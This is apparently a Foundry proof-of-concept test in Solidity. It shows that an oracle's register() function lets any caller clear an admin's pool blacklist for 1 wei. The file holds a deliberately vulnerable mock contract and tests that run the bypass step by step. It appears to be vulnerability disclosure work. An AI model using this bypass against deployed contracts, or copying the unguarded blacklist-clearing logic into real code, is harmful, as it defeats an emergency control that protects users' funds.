// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";

/**
 * @title BlacklistBypassPoC
 * @notice Proves that OracleBase.register() allows ANY unprivileged caller
 *         to clear the admin's blacklist on any pool with just 1 wei.
 *
 * Setup: Minimal mock of OracleBase's register + blacklist logic.
 * The real contract is at:
 *   smart-contracts-poc/contracts/oracles/providers/OracleBase.sol
 */

// Minimal mock replicating OracleBase's exact register() + blacklist logic
contract MockOracleBase {
    uint256 public registrationFee = 1 wei;
    mapping(address => bool) public blacklisted;
    mapping(bytes32 => mapping(address => bool)) public registeredPool;
    mapping(address => bool) public approvedFactories;

    event BlacklistUpdated(address indexed account, bool value);
    event PoolRegistered(bytes32 indexed feedId, address indexed pool, address registrant, uint256 fee);

    error InsufficientFee(uint256 sent, uint256 required);
    error FactoryNotApproved(address factory);
    error Blacklisted(address account);

    // ADMIN function — requires role (simulated with onlyOwner for PoC)
    address public admin;
    modifier onlyAdmin() {
        require(msg.sender == admin, "NOT ADMIN");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    function setBlacklist(address account, bool value) external onlyAdmin {
        blacklisted[account] = value;
        emit BlacklistUpdated(account, value);
    }

    // EXACT copy of OracleBase.register() logic
    function register(bytes32 feedId, address pool, address factory) external payable {
        require(msg.value >= registrationFee, InsufficientFee(msg.value, registrationFee));
        require(pool != address(0));
        require(approvedFactories[factory], FactoryNotApproved(factory));
        // Skip isPool check for PoC (requires external factory contract)

        if (blacklisted[pool]) {
            blacklisted[pool] = false;
            emit BlacklistUpdated(pool, false);
        }

        registeredPool[feedId][pool] = true;
        emit PoolRegistered(feedId, pool, msg.sender, msg.value);
    }

    // Simulates the price() read path — blocked by blacklist
    function price(bytes32 feedId, address pool) external view returns (uint256) {
        require(!blacklisted[pool], Blacklisted(pool));
        require(registeredPool[feedId][pool], "NOT REGISTERED");
        return 1e8; // mock price
    }

    function approveFactory(address factory) external onlyAdmin {
        approvedFactories[factory] = true;
    }
}

contract BlacklistBypassPoC is Test {
    MockOracleBase oracle;
    address admin = address(0xAD);
    address attacker = address(0xA77A);
    address pool = address(0xB001);
    address factory = address(0xFAC7);
    bytes32 feedId = keccak256("ETH/USD");

    function setUp() public {
        vm.startPrank(admin);
        oracle = new MockOracleBase();
        oracle.approveFactory(factory);
        vm.stopPrank();

        vm.deal(attacker, 1 ether);
    }

    // PROOF 1: Admin blacklists pool → price() reverts
    function test_blacklist_blocks_price() public {
        vm.startPrank(admin);
        oracle.setBlacklist(pool, true);
        vm.stopPrank();

        assertTrue(oracle.blacklisted(pool), "Pool should be blacklisted");

        vm.expectRevert();
        oracle.price(feedId, pool);
    }

    // PROOF 2: Attacker clears blacklist with 1 wei via register()
    function test_attacker_clears_blacklist() public {
        // Step 1: Admin blacklists pool
        vm.startPrank(admin);
        oracle.setBlacklist(pool, true);
        vm.stopPrank();
        assertTrue(oracle.blacklisted(pool), "Pool should be blacklisted");

        // Step 2: Attacker calls register() with 1 wei
        vm.startPrank(attacker);
        oracle.register{value: 1 wei}(feedId, pool, factory);
        vm.stopPrank();

        // Step 3: Blacklist is CLEARED
        assertFalse(oracle.blacklisted(pool), "Blacklist should be cleared by attacker");
    }

    // PROOF 3: After bypass, pool can read prices again
    function test_bypass_restores_price_access() public {
        // Admin blacklists
        vm.startPrank(admin);
        oracle.setBlacklist(pool, true);
        vm.stopPrank();

        // Attacker bypasses
        vm.startPrank(attacker);
        oracle.register{value: 1 wei}(feedId, pool, factory);
        vm.stopPrank();

        // Pool can read prices again — admin's protection is defeated
        uint256 price = oracle.price(feedId, pool);
        assertEq(price, 1e8, "Price should be accessible after bypass");
    }

    // PROOF 4: Admin re-blacklists → attacker re-registers → infinite loop
    function test_infinite_loop_admin_vs_attacker() public {
        for (uint256 i = 0; i < 5; i++) {
            // Admin blacklists
            vm.startPrank(admin);
            oracle.setBlacklist(pool, true);
            vm.stopPrank();
            assertTrue(oracle.blacklisted(pool), "Should be blacklisted");

            // Attacker immediately re-registers
            vm.startPrank(attacker);
            oracle.register{value: 1 wei}(feedId, pool, factory);
            vm.stopPrank();
            assertFalse(oracle.blacklisted(pool), "Should be cleared again");
        }
        // Admin can NEVER keep the pool blacklisted
    }

    // PROOF 5: Cost analysis — attacker pays only 1 wei per bypass
    function test_bypass_cost() public {
        uint256 attackerBalBefore = attacker.balance;

        vm.startPrank(admin);
        oracle.setBlacklist(pool, true);
        vm.stopPrank();

        vm.startPrank(attacker);
        oracle.register{value: 1 wei}(feedId, pool, factory);
        vm.stopPrank();

        uint256 cost = attackerBalBefore - attacker.balance;
        assertEq(cost, 1 wei, "Bypass costs only 1 wei");

        console2.log("Bypass cost: %s wei", cost);
        console2.log("Admin's emergency response: DEFEATED for 1 wei");
    }
}
